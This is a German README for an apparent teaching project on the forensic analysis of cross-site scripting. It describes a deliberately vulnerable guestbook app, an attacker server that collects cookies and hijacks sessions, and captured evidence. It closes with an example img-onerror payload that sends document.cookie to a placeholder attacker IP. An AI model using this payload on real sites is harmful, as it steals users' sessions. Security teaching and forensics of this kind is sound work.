# Forensische Analyse von XSS-Angriffen

Dieses Projekt demonstriert einen Cross-Site-Scripting (XSS)-Angriff und dessen forensische Analyse. Es besteht aus einer verwundbaren Webanwendung (xss-defender), einem Angreiferserver (xss-attacker) sowie gesammelten Beweismitteln (beweise).

## Projektstruktur

- **xss-defender/**: Verwundbare Node.js/Express-Webanwendung mit Login, Dashboard und Gästebuch-Funktion.
- **xss-attacker/**: Node.js/Express-Server, der gestohlene Cookies entgegennimmt und automatisiert Angriffe durchführt.
- **beweise/**: Enthält Mitschnitte (z.B. Wireshark `.pcapng`), Server-Logs und HAR-Dateien zur Analyse des Angriffs.

## Ablauf des XSS-Angriffs

1. **Vorbereitung**: Die Webanwendung erlaubt das Posten von Inhalten ohne ausreichendes Escaping.
2. **Angriff**: Ein Angreifer postet einen Beitrag mit einem XSS-Payload, z.B. einem `<img>`-Tag mit `onerror`, der das Session-Cookie an den Angreiferserver sendet.
3. **Diebstahl der Session**: Das Cookie wird vom Browser des Opfers an den Angreiferserver übertragen.
4. **Sessionübernahme**: Der Angreiferserver nutzt das gestohlene Cookie, um im Namen des Opfers Aktionen durchzuführen (z.B. einen weiteren Post).
5. **Forensik**: Die Beweismittel (Netzwerk-Mitschnitt, Server-Logs) zeigen den Ablauf des Angriffs und ermöglichen die Nachverfolgung.

## Forensische Analyse

- **Wireshark-Mitschnitt (`beweise/angriff_wireshark.pcapng`)**: Enthält HTTP-Requests, darunter den Diebstahl und die missbräuchliche Nutzung des Session-Cookies.
- **Server-Logs (`beweise/defender_server_logs.txt`, `beweise/attacker_server_logs.txt`)**: Dokumentieren Logins, Posts und verdächtige Aktivitäten.
- **HAR-Datei (`beweise/devtools.har`)**: Browser-Netzwerkaktivität zur weiteren Analyse.

## Hinweise

- Die Anwendung ist absichtlich verwundbar, um XSS und dessen Folgen zu demonstrieren.
- Die Beweismittel können mit Tools wie Wireshark oder Browser-Devtools analysiert werden.
- Ziel ist es, typische Spuren eines XSS-Angriffs zu erkennen und zu dokumentieren.

## Starten der Komponenten

1. **xss-defender**  
   ```
   cd xss-defender
   npm install
   node app.js
   ```
2. **xss-attacker**  
   ```
   cd xss-attacker
   npm install
   node attacker.mjs
   ```

## Beispiel für einen XSS-Payload

```html
<img src="x" onerror="fetch('http://[ANGREIFER-IP]:8080/stolen_cookie?cookie='+document.cookie)">
```

---

**Achtung:** Dieses Projekt dient ausschließlich zu Lehr- und Analysezwecken!